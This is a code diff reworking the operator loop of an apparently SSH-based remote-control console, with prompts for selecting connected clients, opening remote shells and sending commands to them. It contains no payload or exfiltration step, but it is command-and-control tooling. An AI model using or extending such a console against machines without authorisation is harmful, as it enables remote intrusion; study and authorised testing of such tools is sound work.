@@ -15,10 +15,8 @@ server_session = None
 
 def exit_server_session():
     global server_session
-    if server_session == None: return
     try: server_session.close()
     except OSError: pass
-    server_session = None
 
 def get_client_path():
     if server_session == None: return ""
@@ -27,7 +25,7 @@ def get_client_path():
 
 def shell():
     path = get_client_path()
-    while len(path):
+    while len(path) and path != "clientdisconnected":
         command = input(f"{path}> ").strip()
         if command == "exit":
             server_session.send(command)
@@ -41,33 +39,31 @@ def interact():
     client_no = server_session.recv(1024).decode('utf-8')
     if client_no == "clientnotfound":
         print("Client Not Found")
-    else:
-        while True:
-            if server_session == None: return
-            command = input(f"Client {client_no}> ").strip()
-            if command == "exit":
-                server_session.send(command)
-                return
-            elif command == "shell":
-                server_session.send(command)
-                shell()
-            else:
-                server_session.send(command)
-                print(server_session.recv(1024).decode('utf-8'))
+        return
 
-def process_commands():
-    while True:
-        if server_session == None: return
-        command = input("S> ").strip()
+    while server_session.active and not server_session.closed:
+        command = input(f"Client {client_no}> ").strip()
         if command == "exit":
             server_session.send(command)
             return
-        elif command.split(" ")[0] == "interact":
+        elif command == "shell":
             server_session.send(command)
-            interact()
+            shell()
         else:
             server_session.send(command)
             print(server_session.recv(1024).decode('utf-8'))
+
+def process_commands():
+    command = input("S> ").strip()
+    if command == "exit":
+        server_session.send(command)
+        return
+    elif command.split(" ")[0] == "interact":
+        server_session.send(command)
+        interact()
+    else:
+        server_session.send(command)
+        print(server_session.recv(1024).decode('utf-8'))
 
 
 #connect to the remote ssh server and recieve commands to be #executed and send back output
@@ -88,7 +84,7 @@ def ssh_command(server_address, server_port, username, password):
     )
     #get ssh session
     server_session = server.get_transport().open_session()
-    if server_session.active and not server_session.closed:
+    while server_session.active and not server_session.closed:
         #wait for command, execute and send result ouput
         process_commands()
     exit_server_session()
